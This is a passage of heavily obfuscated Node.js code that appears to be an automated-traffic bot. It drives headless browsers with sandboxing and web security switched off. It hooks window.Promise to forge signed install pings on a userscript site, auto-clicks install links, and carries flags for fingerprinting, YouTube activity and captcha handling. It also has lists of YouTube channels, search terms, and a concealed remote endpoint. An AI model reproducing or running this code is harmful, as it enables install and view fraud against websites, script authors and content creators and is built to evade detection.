                J[0x11 * -0x107 + -0x75a + 0x18e1] = this['block'], J[K >> -0x4 * 0x274 + 0x7cd + 0x205] |= x[-0x109c + -0x1fd * 0x13 + 0x3666 & K], this['block'] = J[-0x1 * -0x6bc + 0x1d * -0xe7 + 0x137f], K >= 0x10a3 + 0x25 * -0xea + 0x3 * 0x5cd && (this['hashed'] || this['hash'](), J[-0x805 * -0x1 + -0x11 * -0x1af + -0x24a4] = this['block'], J[0x20d3 * -0x1 + -0x29e + 0x2381] = J[0x2574 + 0xc7d + -0x31f0] = J[0xd * 0x153 + -0x1d * 0x97 + -0x1a] = J[-0x241c + -0xd21 + -0x628 * -0x8] = J[-0x10e7 * -0x1 + 0xa * 0x359 + 0x325d * -0x1] = J[-0xb4f + -0x37 * -0x2 + 0x1 * 0xae6] = J[0x1cb7 + 0x1db3 + -0xe99 * 0x4] = J[0x214c + -0x1b * -0x15a + -0x45c3] = J[0x5a6 + -0x24d6 + 0x1f38] = J[0x2 * 0x508 + 0x225b + -0x2c62] = J[-0x21e9 * 0x1 + 0x220a * 0x1 + 0x17 * -0x1] = J[-0x1 * 0xf0d + -0x2 * 0x1183 + 0x321e * 0x1] = J[-0x84a + 0x2 * 0x647 + 0x21c * -0x2] = J[-0x1 * -0x2475 + 0x2332 + -0x479a] = J[0x1b38 + -0x1e42 + 0x318] = J[0x1bd0 * 0x1 + -0x103 * -0x15 + -0x1c * 0x1c0] = 0xa47 + -0x1385 * -0x1 + -0x2 * 0xee6), J[0x1173 * 0x1 + 0x102d + 0x1 * -0x2192] = this['hBytes'] << 0x8b7 + 0xb10 + -0x13c4 | this['bytes'] >>> -0x11cb + 0x22bc + 0x1 * -0x10d4, J[-0x1d4a * -0x1 + 0x1303 + -0x82 * 0x5f] = this['bytes'] << 0x80 * -0x8 + 0x5ec + -0x1e9 * 0x1, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x1f4f + 0x1d6e + -0x3cad; J < 0x90c + 0x145f + -0x1d1b; ++J)
                K = Q[J - (0x2238 + -0x157 * -0x13 + -0x3baa)] ^ Q[J - (-0xfe * -0xe + 0x1337 * 0x1 + -0x1 * 0x2113)] ^ Q[J - (0x9c7 * 0x2 + -0x7 * 0x2db + 0x7d)] ^ Q[J - (0x1 * 0x2653 + 0x14b6 + 0x1f * -0x1e7)], Q[J] = K << -0x1b76 + -0x11fc * 0x1 + 0x2d73 | K >>> 0x1876 + 0x19a2 + -0x1 * 0x31f9;
              for (J = 0x1468 + -0x148e + 0x26; J < 0x169e + -0x2047 + 0x9bd * 0x1; J += 0x10b * -0x5 + -0x217 * -0x5 + -0xf * 0x59)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1 * 0x766 + 0x12c2 * 0x1 + -0x1a23 | L >>> -0x1 * -0x1ed + -0x905 * 0x1 + -0x61 * -0x13) + (M & N | ~M & O) + P + (0x950aa94e * -0x1 + 0x21a89c20 + 0xcde486c7) + Q[J] << 0x1819 + -0x1 * 0x1834 + -0x1 * -0x1b) << 0x48b * 0x1 + 0x11 * -0x232 + -0x4 * -0x833 | P >>> -0xb70 + -0x135b * -0x2 + -0x1b2b) + (L & (M = M << -0x1340 + 0xc3c + 0x722 | M >>> 0x1497 + -0x157 * 0x1b + 0xf98) | ~L & N) + O + (-0x87fcf36b + 0x74 * 0x15e551e + 0xbc5f * 0x5c14) + Q[J + (0x21cf + 0x1d96 * -0x1 + -0x438)] << 0x9dc * 0x2 + -0x61 * 0x42 + 0x54a * 0x1) << 0x867 + 0x6dc * 0x1 + -0xf3e | O >>> -0x8be + 0x37 * -0xad + 0x2e04) + (P & (L = L << 0x1f63 + -0x1a66 + -0x4df | L >>> -0x11 * -0x191 + 0x1 * -0x23bc + 0x91d) | ~P & M) + N + (-0x52a9ac43 * 0x2 + -0x6481ce51 + -0x3746 * -0x67268) + Q[J + (0x11d2 * -0x1 + 0x268c + 0x6 * -0x374)] << 0xc06 + 0x3bd * 0x5 + -0x1eb7) << -0x806 + -0xa65 + 0x938 * 0x2 | N >>> 0x9f * -0x18 + -0x1 * -0x1e2c + -0xf29) + (O & (P = P << 0x16d4 + -0x10f6 + 0x5c0 * -0x1 | P >>> 0x17b * 0x7 + 0x7d * -0x2e + 0xc1b) | ~O & L) + M + (0x81f6bf9e + 0x511b8b7f + -0x788fd184) + Q[J + (0x1 * -0x541 + 0x2 * 0x325 + -0x106)] << -0x9ba + -0x1be8 + 0x25a2) << -0x212 * 0x1 + -0xd1 * -0x21 + -0xc6d * 0x2 | M >>> 0x1 * 0x269d + 0x1 * -0x511 + -0x2171) + (N & (O = O << 0x13a8 + 0x10f7 * -0x2 + 0xe64 | O >>> 0x1fd * -0x7 + 0xf9 * 0x27 + 0xc01 * -0x2) | ~N & P) + L + (-0x73d32f8 + 0x183f9 * -0x2c69 + -0x2 * -0x5286ccd9) + Q[J + (-0x2 * -0x1371 + 0x1e30 + -0x450e)] << 0x1b34 + -0xc9c + -0xe98, N = N << 0x24fd + -0x243e + -0xa1 | N >>> 0x234e + -0x10f * 0xb + -0x17a7;
              for (; J < -0x289 + 0x71c + -0x46b; J += -0x1964 + -0x242f * 0x1 + 0x3d98)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x7 * -0x4d9 + 0x373 + 0x1e81 | L >>> 0xa5 * 0x2d + -0x5c8 + -0x171e) + (M ^ N ^ O) + P + (-0x99e182ff + -0x23f65d4b + 0x12cb1cbeb) + Q[J] << -0x189 * 0x9 + 0x143b * -0x1 + 0x220c) << -0x5e9 * -0x1 + -0x10f9 + -0x1 * -0xb15 | P >>> 0xbf * -0x26 + -0x1 * 0x923 + 0x322 * 0xc) + (L ^ (M = M << 0xe8e + -0x1127 + 0x2b7 * 0x1 | M >>> -0x34 * 0x1d + -0x901 * 0x1 + -0x7 * -0x221) ^ N) + O + (-0x122 * 0x725a25 + -0xbb996f69 + -0x26e87f5c * -0xb) + Q[J + (-0x5 * 0x1b3 + -0x1043 + -0x841 * -0x3)] << -0x6a6 + 0x11c5 * 0x1 + -0xb1f * 0x1) << 0x1dea + -0x2 * 0xaf2 + 0x801 * -0x1 | O >>> -0x1 * -0x11da + -0x2649 + -0x148a * -0x1) + (P ^ (L = L << 0x4b7 * -0x7 + -0x15e + 0x227d | L >>> -0x1b43 + 0xc0d + 0xf38) ^ M) + N + (-0x59f * 0x20f803 + -0x8c11c3 * -0x72 + 0xe9cc1ba8) + Q[J + (0x1 * 0x171d + 0x1 * 0x1a18 + 0xb * -0x479)] << -0x2f7 + -0x9a5 * -0x3 + -0x19f8) << -0xa * 0x371 + -0x1061 + 0x32d0 | N >>> -0x178 + 0x4f * -0x5 + 0x2 * 0x18f) + (O ^ (P = P << 0x1b9b + -0x12ce + -0x1 * 0x8af | P >>> -0xecb + -0x2 * 0xfbc + 0x2e45) ^ L) + M + (-0x4cdb * -0x1b4b5 + -0x6217e83a + -0x4 * -0x1375a041) + Q[J + (-0x1 * 0x17f + 0x3eb * -0x1 + 0x56d)] << -0x2d * 0x68 + -0x1 * 0x11e9 + 0x73d * 0x5) << 0x1f60 + 0x3d7 * -0x8 + -0xa3 | M >>> -0x7 * -0x456 + -0x494 * -0x1 + -0x22d3) + (N ^ (O = O << -0x1310 + 0x387 * -0x1 + 0x16b5 | O >>> 0x13b0 + -0x1c8d + 0x3 * 0x2f5) ^ P) + L + (0x8 * -0x1292b92d + -0x11f * 0x25de19 + -0x1ba40c * -0xaec) + Q[J + (0x4d * 0x3b + 0xf67 * 0x1 + 0x2122 * -0x1)] << -0xbcb + -0x9e5 + 0x10 * 0x15b, N = N << -0x1add + 0x2637 + 0x59e * -0x2 | N >>> -0x1 * -0x107e + -0xfac + -0xd0;
              for (; J < 0x1f * -0x44 + -0x1e61 + 0xd * 0x2fd; J += -0x12 + 0x2f8 + -0x2e1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0xf * 0x73 + 0x91e + -0xfd6 * 0x1 | L >>> 0xbd * 0x2 + 0x9 * 0x241 + -0x15a8) + (M & N | M & O | N & O) + P - (0x78068a7 + -0x7727283d + 0x7045815d * 0x2) + Q[J] << 0x1 * -0x19d5 + -0x73e + 0x2113) << 0x1e20 + -0xfa6 + -0xe75 | P >>> 0x24f6 + 0x43d + 0x4 * -0xa46) + (L & (M = M << -0xff + 0x202f + -0x1f12 | M >>> -0x569 + -0x7b * 0x33 + 0x2fe * 0xa) | L & N | M & N) + O - (-0xf31ab3 * -0x45 + -0xbc578f5d + 0xebb5a042) + Q[J + (0xec1 + -0x1524 * 0x1 + -0x199 * -0x4)] << -0x17 * -0x121 + -0x2 * 0x95c + 0x173 * -0x5) << 0x1c * 0x17 + -0x110 + -0x16f * 0x1 | O >>> 0xa01 * 0x2 + -0x1be5 * 0x1 + 0x7fe) + (P & (L = L << -0x1fd6 + 0x3fb + 0xb * 0x28b | L >>> -0x18e2 + 0x3a5 * -0x4 + 0x2778) | P & M | L & M) + N - (-0x471266f0 + -0x2cf5 * 0x115f9 + 0xe8c77d61) + Q[J + (0x2 * -0x613 + -0x54f + 0x11 * 0x107)] << -0x5 * -0x5ea + -0x1 * 0x1b97 + -0x1fb) << 0x2695 + -0x1 * 0x25de + -0xb2 | N >>> -0xc4a * 0x1 + 0xaed + 0x8 * 0x2f) + (O & (P = P << -0x18 * 0xf6 + -0x2b * 0x2b + 0x1e67 | P >>> 0xfd1 * -0x2 + -0x46c + 0x2410) | O & L | P & L) + M - (-0x1 * -0xbd850aa1 + 0xc21f7 * 0xd10 + -0xeb1c71ed) + Q[J + (0x2617 * -0x1 + 0x11ab * 0x2 + 0x2c4)] << -0x5 * 0x3 + 0x3 * 0xa81 + -0x1f74) << -0x1143 + -0x364 * 0x1 + 0x14ac | M >>> 0x822 + -0xa94 + -0x1 * -0x28d) + (N & (O = O << -0x1 * 0x2df + -0x1ceb * -0x1 + 0x1 * -0x19ee | O >>> 0x311 + 0xfc6 * -0x2 + 0x1c7d) | N & P | O & P) + L - (0x8 * 0x3f24a52 + -0x1 * 0xc6e53c3 + 0x5dc04457) + Q[J + (0x1 * -0x1163 + -0x1369 * -0x2 + -0x156b)] << -0x1ba1 + 0x77 * -0x3b + 0x370e, N = N << -0x15a9 + 0x9b * -0x3a + 0x38e5 | N >>> -0x1 * -0x6f + -0x1b * -0xfa + -0x1acb;
              for (; J < -0x14a6 + 0x3 * -0x649 + 0x27d1; J += 0x1ce1 + 0x1ffd + 0x25 * -0x1a5)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x13f1 * 0x1 + 0x1191 + -0x55b * 0x7 | L >>> 0x15e9 + -0xd70 + -0x33 * 0x2a) + (M ^ N ^ O) + P - (0x1359b * -0xa + 0x3ad69b00 + 0x36828 * -0x185) + Q[J] << 0x7 * 0x421 + -0x1 * -0x74f + 0x3 * -0xc12) << -0x15ac + -0x1 * -0x463 + 0x114e | P >>> -0x1f39 * -0x1 + -0x392 + 0x2b * -0xa4) + (L ^ (M = M << 0x2 * 0x6e2 + 0x1 * -0x252b + 0x1785 | M >>> 0x1 * 0x3d1 + -0xbcc + 0x199 * 0x5) ^ N) + O - (0x63ac4af3 * -0x1 + -0x64f7a8d9 + -0xfe4131f6 * -0x1) + Q[J + (0xb3f * 0x1 + -0x283 * 0xd + 0x1569)] << -0x189 * -0x3 + 0x5ab * -0x3 + 0xc66) << -0xeb + 0x1f98 + -0x9 * 0x368 | O >>> -0xe0d + 0x1145 * 0x1 + -0x1 * 0x31d) + (P ^ (L = L << 0x317 * -0x2 + -0x624 + 0xc70 | L >>> 0x19b4 + -0x4d3 + -0x14df) ^ M) + N - (0x68ff * -0x47c6 + -0x14f03038 * -0x3 + 0x143c9bbc) + Q[J + (0x81b + 0x1c * 0xce + -0x1ea1)] << 0x2283 + 0x1910 + 0x65 * -0x97) << 0x5ba + -0x1 * 0xaeb + -0x1 * -0x536 | N >>> -0x630 + 0x387 + 0x3 * 0xec) + (O ^ (P = P << -0x1345 + 0x21a9 + -0xe46 | P >>> -0xb52 * 0x1 + 0x12d8 + -0x784) ^ L) + M - (-0x1dfced6 * -0x28 + 0x14357809 + -0x29908b4f) + Q[J + (-0x121e + 0x1780 + 0x55f * -0x1)] << -0x1 * -0x12ad + 0x19bc + 0x1 * -0x2c69) << -0x1 * -0x115f + -0xa64 + 0x63 * -0x12 | M >>> 0x24ba + -0x1dff + -0x20 * 0x35) + (N ^ (O = O << -0x2 * 0x6b2 + -0xf7e + 0x1d00 | O >>> 0x3a1 * 0x7 + -0x2636 + 0xcd1) ^ P) + L - (-0x55dc3aa3 + 0x1 * 0x4b77f6cc + -0x40018201 * -0x1) + Q[J + (-0x11d9 + 0x1c0b + -0xa2e)] << 0xca5 + -0x1d3 + -0xad2, N = N << 0x80d + -0x4fa + 0x1 * -0x2f5 | N >>> -0x43b + 0x101 * -0x6 + 0xa43;
              this['h0'] = this['h0'] + L << 0x1 * 0x102b + -0x19 * -0xb5 + 0xe4 * -0x26, this['h1'] = this['h1'] + M << -0x649 * 0x3 + 0x477 + 0xe64, this['h2'] = this['h2'] + N << -0xfb6 + 0x212 * 0x2 + 0xb92, this['h3'] = this['h3'] + O << 0x24fb + -0x503 * 0x4 + -0x10ef, this['h4'] = this['h4'] + P << -0x1f0f + -0xec1 * 0x2 + 0x7 * 0x8a7;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x942 + 0x10cf + -0x771 & 0x2 * 0x5d1 + -0xa11 * 0x3 + 0x12a0] + w[J >> 0x2149 + -0x2613 + 0x4e2 & -0x1735 + 0xb * -0xc1 + 0x3 * 0xa85] + w[J >> 0x1 * 0x130a + -0x18f0 + 0x5fa & 0x95 * -0x38 + 0xa32 + -0x1675 * -0x1] + w[J >> -0x1f07 + -0x1f * -0x16 + 0x1c6d & -0x15 * -0xa7 + -0x11d7 + -0x433 * -0x1] + w[J >> 0x1 * 0x3d6 + -0x55b * 0x5 + -0x217 * -0xb & 0x258f + -0x1a22 + 0x246 * -0x5] + w[J >> -0x20a1 * 0x1 + 0x1 * 0x1d9a + 0x30f & -0x317 * 0x4 + -0x1e3 * -0x9 + -0x8 * 0x92] + w[J >> 0x893 + -0xc3a + -0x3ab * -0x1 & 0x22 * 0x11 + 0x60f * -0x5 + -0x3a * -0x7c] + w[-0x1099 + 0x113e * -0x2 + -0x1992 * -0x2 & J] + w[K >> -0x118 * 0x5 + 0xd77 + -0x3 * 0x2a1 & -0x266 * -0xc + 0x2 * -0x1001 + 0x349] + w[K >> 0xdc4 + 0x6d2 + 0x56 * -0x3d & -0x13 * -0x202 + 0xc58 + -0x326f] + w[K >> 0x139 * 0x3 + -0x657 * 0x6 + 0x2273 & 0x4 * 0x6a3 + 0xf2 * 0x4 + -0x35d * 0x9] + w[K >> -0x1b68 + 0x1 * 0x1e16 + -0x29e & 0x1 * -0x1401 + -0x2 * -0x12e2 + -0x16 * 0xce] + w[K >> -0x495 + -0x759 + 0xbfa & -0x1 * -0x55d + -0x1fa9 + 0x1a5b] + w[K >> 0x8a1 + 0x3cd * -0x4 + -0x69b * -0x1 & 0x14bd + -0x88d + -0xc21] + w[K >> -0x23e0 + -0xaf1 + -0x277 * -0x13 & -0x180d + -0x1d37 + 0xb * 0x4d9] + w[-0x11d2 + 0x27 * 0x7d + -0x12a * 0x1 & K] + w[L >> 0x1 * 0x234e + -0x5 * -0x254 + -0x2ed6 & 0x1be7 * -0x1 + 0x6a0 * 0x2 + 0xeb6] + w[L >> 0x6e0 + 0xf8 + -0x7c0 & 0x1778 + 0x1 * -0x92b + -0xe3e] + w[L >> -0xf0f + 0x1beb + -0xcc8 & -0x935 + 0x19a + -0xda * -0x9] + w[L >> 0x174b + -0x502 + -0x613 * 0x3 & 0x1a * -0x85 + 0x25f * -0xe + 0x2ec3 * 0x1] + w[L >> 0x1 * -0x4c1 + -0x962 * -0x4 + -0x3a3 * 0x9 & 0xbc2 + -0xe27 * -0x1 + -0x19da] + w[L >> 0x8e2 + 0x120c + -0x1ae6 & 0x1b0 * -0x5 + -0xbb * -0x29 + -0xaba * 0x2] + w[L >> 0x16ed + 0x2007 + 0xdbc * -0x4 & 0x10d * -0x18 + -0x2011 + -0x5bc * -0xa] + w[-0x1cdd + -0x6ab * -0x1 + 0x279 * 0x9 & L] + w[M >> -0x1036 + -0x1bb5 + 0x2c07 & 0xbaa + 0x159 * -0x17 + 0x1364 * 0x1] + w[M >> 0x251d + 0x2467 + -0x2 * 0x24b6 & 0x6 * -0x2b9 + -0x1361 + 0x2 * 0x11e3] + w[M >> -0x73 * -0x47 + 0x17fb + 0x37cc * -0x1 & -0x39c + -0xb * 0x1b9 + -0x243 * -0xa] + w[M >> -0x2084 * -0x1 + 0x1067 + -0x30db & 0x9 * -0x3cd + -0x1dd4 + 0x4018] + w[M >> 0x8fe * -0x3 + 0x9 * 0x49 + 0x1875 & -0x206f * 0x1 + -0x4ae * 0x1 + 0x252c] + w[M >> -0x1ba2 + 0x86a + -0x134 * -0x10 & -0x93f + 0x22 * 0x7 + 0x860] + w[M >> -0x1 * -0x20fd + -0xb * -0x2c5 + -0x3f70 & -0x1967 + -0x2d3 + 0x22d * 0xd] + w[-0xa57 + 0x2583 + 0x1b1d * -0x1 & M] + w[N >> 0x1 * -0x1146 + 0x254 * 0x5 + 0x5be * 0x1 & -0x1 * 0x1acf + -0x267a + -0x11 * -0x3d8] + w[N >> 0xde7 * -0x1 + -0x195f + 0x275e * 0x1 & -0xc88 + 0x28f * -0x2 + -0x5e7 * -0x3] + w[N >> 0x10a6 + 0x2479 * 0x1 + -0x350b & -0x70c + 0x2ee + 0x42d * 0x1] + w[N >> 0x2 * 0xafa + -0x124 + -0x14c0 & 0x2d5 + -0x1e89 + -0x941 * -0x3] + w[N >> -0xc * 0x6f + -0x1b34 + 0x10c * 0x1f & 0x2c * 0x4 + 0xcd9 + -0xd7a] + w[N >> -0x337 * 0x2 + -0xd8b + 0x1 * 0x1401 & 0xc3e + -0x9d * -0x3 + 0x703 * -0x2] + w[N >> -0x1 * 0x1043 + -0x1 * -0x1e33 + -0x1b * 0x84 & -0x18d9 * -0x1 + 0x1 * -0x225c + 0x992] + w[-0x6a * 0x10 + -0x2 * 0x127d + -0x2ba9 * -0x1 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x1f54 + -0xe60 + 0xa6 * -0x1a & -0x5de * 0x1 + -0x1a0a + 0x20e7,
                J >> -0x13f2 + -0x2569 * 0x1 + -0x1 * -0x396b & 0x1bbe + -0x27a + -0x1845,
                J >> -0xed4 + 0x1 * 0x9fd + 0x4df & -0x6 * -0x56c + -0x1 * 0x3e7 + -0x9 * 0x312,
                0x1602 + 0xd52 + -0x2255 & J,
                K >> 0x1520 + 0x1e9a + -0x6 * 0x89b & -0x1 * -0x7df + -0x150a + 0xe2a,
                K >> 0x1b3a * 0x1 + -0x5 * -0x93 + -0x1e09 & -0x17b7 + 0x160e + 0x2a8,
                K >> -0x5b8 + -0x1 * 0x1352 + -0x1 * -0x1912 & -0x151 * -0x1a + -0x15ee + -0xb4d,
                -0x1 * 0x6df + -0x17b5 + 0x1f93 & K,
                L >> -0x7c1 * -0x5 + 0x3e * -0x1d + -0x25 * 0xdb & 0x2109 * 0x1 + -0x1 * 0x21fa + 0x1f0,
                L >> -0xa19 + -0x3 * -0x178 + -0x1eb * -0x3 & -0x21de + 0x219a + 0x1 * 0x143,
                L >> -0x2352 + 0x1fa3 + 0x3b7 & 0x1 * -0xb29 + 0xd46 + -0xd * 0x16,
                -0x106e + -0x8 * -0xae + 0x1 * 0xbfd & L,
                M >> 0x311 + 0x26ba + -0xaf * 0x3d & 0xd3c + 0x1540 + -0x217d,
                M >> -0x2 * 0x1f4 + 0x2224 + 0x2 * -0xf16 & -0x1a55 + -0x44d * -0x3 + 0x1 * 0xe6d,
                M >> -0x23 * -0x52 + 0x1be6 + -0x2714 & 0x12ba + 0x1e4 + -0x139f,
                -0x1460 + 0x15b4 + -0x55 * 0x1 & M,
                N >> -0x28a + 0x860 + 0x2 * -0x2df & 0x602 * 0x2 + 0x56 * 0x1c + -0x146d,
                N >> 0x2a7 + -0x2 * 0x9f1 + 0x114b & 0xd * 0x1bb + -0x1b * 0x37 + -0xfb3,
                N >> -0x106 * 0x4 + -0x5 * -0x581 + -0x1765 & -0x225c + 0x1f * 0x25 + 0x1ee0,
                -0x1 * -0x419 + -0x1 * 0x2271 + 0x1f57 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x294 + -0xe92 + 0x113a), (K = new DataView(J))['setUint32'](0xd69 + -0xf69 + 0x200, this['h0']), K['setUint32'](0x1f66 + 0x64 * -0x2c + -0xe32, this['h1']), K['setUint32'](-0xc * 0x334 + 0x1d98 + 0x8e0, this['h2']), K['setUint32'](0xa02 + -0x43 * -0xb + -0xcd7, this['h3']), K['setUint32'](0x1157 + 0x1be5 * -0x1 + 0xa9e, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0xc75 + -0x2063 * -0x1 + -0x2cd8];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x73 * 0x3e + 0x1fcf + -0x1 * 0x3f5;
            J[0xd * -0xdd + 0x393 + 0x7a6 * 0x1]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0xd9 * -0x29 + 0x4e7 + -0x1 * -0x1dda] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x1488 + 0x2302 * 0x1 + -0xd * 0x11d), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x4f6 + -0x106 * 0x23 + 0x1edd;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x504 + -0x9 * 0xee + 0x936 * 0x1), Promise['resolve'](0xbd + -0x4a * -0x6d + -0x203e * 0x1);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s[W(0x1d, 'N]kC')](), await r['close'](), i());
    }
  }
  for (let j = -0x106f + -0x23 * -0x1d + 0x3 * 0x428; j < -0x37e * 0x3 + 0x5f2 * -0x1 + 0x106d; j++)
    i();
}
const NETWORK_PATIENCE = -0x1 * 0x13d9 + -0x1c8b * 0x1 + 0xc * 0x6a3 + (-0x1a86 + -0x46 * 0x35 + 0xfa * 0x36) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x13c7 + 0x89f * -0x2 + 0x2508) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      X(0xb) + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x26a0 * -0x1 + 0x195a * -0x1 + 0x3ffa; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + X(0xd) + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), 